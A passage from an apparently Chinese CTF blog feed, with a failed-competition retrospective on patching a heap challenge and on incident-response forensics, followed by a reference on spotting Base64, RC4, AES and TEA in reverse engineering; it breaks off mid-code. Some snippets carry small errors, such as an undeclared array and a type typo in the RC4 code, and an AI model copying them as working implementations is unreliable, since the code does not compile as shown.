    <content type="html"><![CDATA[<p>虽然失败了但是还是简单记录下遇到的问题</p><h1>awdp</h1><p>首先，这是最无语的环节，等过几天选手的blog可能会有wp研究下，最简单的题目10次用完了都一直操作失败是真的不懂。整个程序只有add，edit和delete。delete虽然没有UAF但是谨慎起见我也把free nop了。而add则不允许输入，只有一个idx。</p><p>edit里存在漏洞，snprintf他迷惑人，将fmt和实际read的0x100两个参数对调了一下，看着没问题，实际上VulFi一扫或者鼠标放上去看一下函数原型就知道了，把这个修了，没过。后面的输入环节也不会溢出，大小全是无符号check，size独立放在chunk内部。</p><p>我承认中间浪费了很多机会（虽然不知道具体原因），猜测可能是和本地patchelf了libc路径有关，<a href="http://xn--update-957i43fj1g26gzsx1fvmljh3cyy5auo8e.sh">也可能是没有按例子写update.sh</a>（用的bash而非sh），还有几次是发现ida抽风了patch写入没写进去，还是gdb动调发现和ida不一样才知道的。但是最后几次应该没有其他问题了才对。</p><p>另外最后看了下一个protobuf的题。你妈的国赛内部怀疑有人天天用这神人protobuf开发，从23年到现在，从初赛到决赛，到处塞这protobuf。虽然当时复现研究过但是最后时间不够了，而且我linux上没有protobuf环境，气笑了。看了下结构体也是个勾八菜单堆，用类似虚拟机/vtable的形式进行调用，找了下输入，把memcpy劫持到ehframe上自己实现的memcpy，即调用之前永远对rdx置零。试了下不出所料的操作失败了，prctl通防当然也不行，于是遗憾离场。</p><h1>isw</h1><p>渗透当然是不懂就不谈了，重点谈谈应急响应。没有找对取证工具真的太亏了。</p><p>首先一个，抓ip是叶大师ssh上去之后tcpdump看到的ip，但是没显示进程id或者路径（结果到最后都没找到程序…）。然后010直接打开镜像搜ip，结果直接搜到了程序，后面就一直想办法把这个拖出来。</p><p>但是往前找到最近的ELF之后ida打不开，还是莫名其妙只有叶大师的ida能打开不烂…从里面翻了点信息md5交了几个flag。</p><p>AutoPsy一直在虚拟机里跑这个镜像，又慢又卡。换了一个，Magnet AXIOM，也是虚拟机里一下就好了，而且sudo的内容会存到auth.log里面，直接审内核日志就能复原当时命令执行的情况，包括文件名字什么的，真的sb啊，选择远大于努力这一块。</p><p>或许有取证大师会好一点？</p><h1>wp</h1><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247487308&amp;idx=1&amp;sn=58ded47969223626e9937b5ccf93d3a8&amp;chksm=cef98a3b1b7ee9a0deeb2746fb95e0bd6fb6e0d7adf55a9902ee121c3e7533efcde91d9498fc&amp;mpshare=1&amp;scene=23&amp;srcid=0318w22pdH0PdB7Tj2Cbw5B0&amp;sharer_shareinfo=a714674b8023b181d0876977bde50035&amp;sharer_shareinfo_first=a714674b8023b181d0876977bde50035#rd">Here</a></p><p>很难评，某种意义上这个patch也是对脑洞的过程。至今我也不知道它会check什么，疑似会检查符号。</p><h1>最后</h1><ul class="lvl-0"><li class="lvl-2"><p>protobuf这玩意似乎只有国赛一直在搞…，配个环境熟悉下</p></li><li class="lvl-2"><p>应急响应这块还是少点经验，之前学长法国windows应急响应手册，早知道赛前发应急响应附件之后就去看下linux的了，比赛结束才想起来。</p></li><li class="lvl-2"><p>patch的还是太激进了，但是题目确实一坨，snprintf栈上格式化为什么没有exp打…还有哪里来的堆溢出，snprintf参数写反了真的没人发现吗…</p></li><li class="lvl-2"><p>累了，队里的web手也被反直觉patch恶心了，包括扫git用的工具有问题扫不出来，给的附件是www结果patch要放到www/html下…4h超级过载已经管不了了</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽然失败了但是还是简单记录下遇到的问题&lt;/p&gt;
&lt;h1&gt;awdp&lt;/h1&gt;
&lt;p&gt;首先，这是最无语的环节，等过几天选手的blog可能会有wp研究下，最简单的题目10次用完了都一直操作失败是真的不懂。整个程序只有add，edit和delete。delete虽然没有UAF但是谨</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>常见的加密编码算法逆向识别</title>
    <link href="https://zjw1nd.github.io/2025/03/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/"/>
    <id>https://zjw1nd.github.io/2025/03/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/</id>
    <published>2025-03-12T02:07:48.000Z</published>
    <updated>2025-03-17T14:23:30.912Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考自 <a href="https://www.cnblogs.com/Moomin/p/15004170.html#aes">https://www.cnblogs.com/Moomin/p/15004170.html#aes</a></p></blockquote><h1>Base64</h1><h2 id="识别">识别</h2><p>一个索引串<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code></p><h2 id="IO">IO</h2><p>可能做魔改调整, 6位索引一个ascii码的索引换掉，此时我们用bytes.maketrans方法定义一个转换函数即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">encoded_data = base64.b64encode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">decoded_data = base64.b64decode(encoded_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 魔改：</span></span><br><span class="line">custom_alphabet = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">custom_b64encode_table = <span class="built_in">bytes</span>.maketrans(</span><br><span class="line">    <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>,</span><br><span class="line">    custom_alphabet.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">)</span><br><span class="line">custom_b64decode_table = <span class="built_in">bytes</span>.maketrans(</span><br><span class="line">    custom_alphabet.encode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">    <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_b64encode</span>(<span class="params">data</span>):</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    <span class="keyword">return</span> encoded.translate(custom_b64encode_table)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_b64decode</span>(<span class="params">data</span>):</span><br><span class="line">    translated = data.translate(custom_b64decode_table)</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(translated)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用自定义索引表进行编码</span></span><br><span class="line">encoded_data = custom_b64encode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">decoded_data = custom_b64decode(encoded_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h1>RC4</h1><h2 id="识别-2">识别</h2><p>对称，流加密，2个核心，初始化S盒，加密和解密是对称的。识别方式主要是看一个256次的for循环，尤其是s盒初始化函数，其对256字节的数组按照下标从0开始赋值，这一特征比较明显。</p><p>其他特征可以参考下面的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*初始化函数*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*key,<span class="type">unsigned</span> <span class="type">long</span> Len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//char k[256]=&#123;0&#125;;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">        k[i]=key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*加解密*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*Data,<span class="type">unsigned</span> Long Len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++)&#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k]^=s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IO-2">IO</h2><p>需求crypto模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个随机密钥</span></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化RC4加密器</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密数据</span></span><br><span class="line">data = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">encrypted_data = cipher.encrypt(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted: <span class="subst">&#123;encrypted_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化RC4解密器</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密数据</span></span><br><span class="line">decrypted_data = cipher.decrypt(encrypted_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted: <span class="subst">&#123;decrypted_data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>注意的是，rc4是一个流加密算法，每次初始化只能获得一个固定的加密器，即new一次之后，后续调用encrypt时会一直“继续”当前的加密，即假设几次需要加密的明文是连续的。如果题目中的rc4每次调用都走了一遍初始化流程，则io也需要对应的每次都new一个新的加密器——即使密钥没有发生变化。</p><p>另外，rc4作为对称加密，加解密算法是一样的。</p><h1>AES</h1><h2 id="识别-3">识别</h2><p>老生常谈，标准AES的识别就是其独有的S盒内容。其S盒和逆S盒数据如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F</span><br><span class="line">0 63 7c 77 7b f2 6b 6f c5 30  1 67 2b fe d7 ab 76</span><br><span class="line">1 ca 82 c9 7d fa 59 47 f0 ad d4 a2 af 9c a4 72 c0</span><br><span class="line">2 b7 fd 93 26 36 3f f7 cc 34 a5 e5 f1 71 d8 31 15</span><br><span class="line">3  4 c7 23 c3 18 96  5 9a  7 12 80 e2 eb 27 b2 75</span><br><span class="line">4  9 83 2c 1a 1b 6e 5a a0 52 3b d6 b3 29 e3 2f 84</span><br><span class="line">5 53 d1  0 ed 20 fc b1 5b 6a cb be 39 4a 4c 58 cf</span><br><span class="line">6 d0 ef aa fb 43 4d 33 85 45 f9  2 7f 50 3c 9f a8</span><br><span class="line">7 51 a3 40 8f 92 9d 38 f5 bc b6 da 21 10 ff f3 d2</span><br><span class="line">8 cd  c 13 ec 5f 97 44 17 c4 a7 7e 3d 64 5d 19 73</span><br><span class="line">9 60 81 4f dc 22 2a 90 88 46 ee b8 14 de 5e  b db</span><br><span class="line">a e0 32 3a  a 49  6 24 5c c2 d3 ac 62 91 95 e4 79</span><br><span class="line">b e7 c8 37 6d 8d d5 4e a9 6c 56 f4 ea 65 7a ae  8</span><br><span class="line">c ba 78 25 2e 1c a6 b4 c6 e8 dd 74 1f 4b bd 8b 8a</span><br><span class="line">d 70 3e b5 66 48  3 f6  e 61 35 57 b9 86 c1 1d 9e</span><br><span class="line">e e1 f8 98 11 69 d9 8e 94 9b 1e 87 e9 ce 55 28 df</span><br><span class="line">f 8c a1 89  d bf e6 42 68 41 99 2d  f b0 54 bb 16</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F</span><br><span class="line">0 52  9 6a d5 30 36 a5 38 bf 40 a3 9e 81 f3 d7 fb</span><br><span class="line">1 7c e3 39 82 9b 2f ff 87 34 8e 43 44 c4 de e9 cb</span><br><span class="line">2 54 7b 94 32 a6 c2 23 3d ee 4c 95  b 42 fa c3 4e</span><br><span class="line">3  8 2e a1 66 28 d9 24 b2 76 5b a2 49 6d 8b d1 25</span><br><span class="line">4 72 f8 f6 64 86 68 98 16 d4 a4 5c cc 5d 65 b6 92</span><br><span class="line">5 6c 70 48 50 fd ed b9 da 5e 15 46 57 a7 8d 9d 84</span><br><span class="line">6 90 d8 ab  0 8c bc d3  a f7 e4 58  5 b8 b3 45  6</span><br><span class="line">7 d0 2c 1e 8f ca 3f  f  2 c1 af bd  3  1 13 8a 6b</span><br><span class="line">8 3a 91 11 41 4f 67 dc ea 97 f2 cf ce f0 b4 e6 73</span><br><span class="line">9 96 ac 74 22 e7 ad 35 85 e2 f9 37 e8 1c 75 df 6e</span><br><span class="line">a 47 f1 1a 71 1d 29 c5 89 6f b7 62  e aa 18 be 1b</span><br><span class="line">b fc 56 3e 4b c6 d2 79 20 9a db c0 fe 78 cd 5a f4</span><br><span class="line">c 1f dd a8 33 88  7 c7 31 b1 12 10 59 27 80 ec 5f</span><br><span class="line">d 60 51 7f a9 19 b5 4a  d 2d e5 7a 9f 93 c9 9c ef</span><br><span class="line">e a0 e0 3b 4d ae 2a f5 b0 c8 eb bb 3c 83 53 99 61</span><br><span class="line">f 17 2b  4 7e ba 77 d6 26 e1 69 14 63 55 21  c 7d</span><br></pre></td></tr></table></figure><p>前4个字节就够了，search一下发现了基本100%是AES。相关函数全跳过就行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[明文] --&gt;|分组| B[初始轮密钥加]</span><br><span class="line">    B --&gt; C[轮函数]</span><br><span class="line">    C --&gt;|重复Nr-1次| D[最终轮]</span><br><span class="line">    D --&gt; E[密文]</span><br><span class="line"></span><br><span class="line">    subgraph 轮函数</span><br><span class="line">        C1[字节代换] --&gt; C2[行移位]</span><br><span class="line">        C2 --&gt; C3[列混淆]</span><br><span class="line">        C3 --&gt; C4[轮密钥加]</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    subgraph 最终轮</span><br><span class="line">        D1[字节代换] --&gt; D2[行移位]</span><br><span class="line">        D2 --&gt; D3[轮密钥加]</span><br><span class="line">    end</span><br></pre></td></tr></table></figure><p>可能有魔改，如果识别算法的话重点在以下：</p><ul class="lvl-0"><li class="lvl-2"><p>初始化16*11大小的扩展密钥（其中第一个16字节包含原始秘钥，每4字节颠倒，即abcdabcd-&gt;dcbadcba）</p></li><li class="lvl-2"><p>行移位和列混合算法的特征</p></li></ul><h2 id="IO-3">IO</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个随机密钥</span></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)  <span class="comment"># AES-128</span></span><br><span class="line">iv = get_random_bytes(<span class="number">16</span>)   <span class="comment"># 初始化向量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化AES加密器</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密数据</span></span><br><span class="line">data = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">padded_data = pad(data.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)</span><br><span class="line">encrypted_data = cipher.encrypt(padded_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted: <span class="subst">&#123;encrypted_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化AES解密器</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密数据</span></span><br><span class="line">decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted: <span class="subst">&#123;decrypted_data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h1>TEA</h1><p>目前没遇见过，只能抄了</p><p>tea也是一个简单的对称加密算法，初始化一个128位密钥，按64位分组处理明文。其中有一个magic_number DELTA：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9981abcd</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tea_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">unsigned</span> <span class="type">int</span>* key)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123; <span class="comment">//进行32次迭代加密，Tea算法作者的建议迭代次数</span></span><br><span class="line">    l += (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    sum += DELTA; <span class="comment">//累加Delta的值</span></span><br><span class="line">    r += (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]); <span class="comment">//利用多次双位移和异或将明文与密钥扩散混乱，并将两个明文互相加密</span></span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l;</span><br><span class="line">  v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tea_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">unsigned</span> <span class="type">int</span>* key)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line">  sum = DELTA * <span class="number">32</span>; <span class="comment">//32次迭代累加后delta的值</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    r -= (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    sum -= DELTA;</span><br><span class="line">    l -= (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l;</span><br><span class="line">  v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key1[<span class="number">4</span>]=&#123;<span class="number">0xa3eeb7be</span>,<span class="number">0x50e7de9a</span>,<span class="number">0x6dbcc2bc</span>,<span class="number">0x78591fad</span>&#125;;<span class="comment">//key1</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key2[<span class="number">4</span>]=&#123;<span class="number">0x78591fad</span>,<span class="number">0x6dbcc2bc</span>,<span class="number">0xa3eeb7be</span>,<span class="number">0x50e7de9a</span>&#125;;<span class="comment">//key2</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v1[<span class="number">2</span>] = &#123;<span class="number">0x556E2853</span>,<span class="number">0x4393DF16</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v2[<span class="number">2</span>] = &#123;<span class="number">0x1989FB2B</span>,<span class="number">0x83F5A243</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//encrypt(v1,key1);</span></span><br><span class="line">    <span class="comment">//printf(&quot;tea_encrypt:%x %x\n&quot;,v1[0],v1[1]);</span></span><br><span class="line">    <span class="comment">//encrypt(v2,key2);</span></span><br><span class="line">    <span class="comment">//printf(&quot;tea_encrypt:%x %x\n&quot;,v2[0],v2[1]);</span></span><br><span class="line">    tea_decrypt(v1,key1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tea_decrypt:%x %x\n&quot;</span>,v1[<span class="number">0</span>],v1[<span class="number">1</span>]);</span><br><span class="line">    tea_decrypt(v2,key2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tea_decrypt:%x %x\n&quot;</span>,v2[<span class="number">0</span>],v2[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//tea_decrypt:c0cacd59 38bb7623</span></span><br><span class="line"><span class="comment">//tea_decrypt:8757d16 a520cece</span></span><br></pre></td></tr></table></figure><p>其中默认的DELTA一般为 0x9e3779b9 或者 0x61c88647（分别是加和减，其实影响是等价的）</p><p>魔改算法一般会修改这个DELTA值，不过识别也很容易，这个值太孤立了。</p><h2 id="IO-4">IO</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">DELTA = <span class="number">0x9981abcd</span>  <span class="comment"># 自定义 DELTA 值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_encrypt</span>(<span class="params">v, key</span>):</span><br><span class="line">    l, r = v[<span class="number">0</span>], v[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span 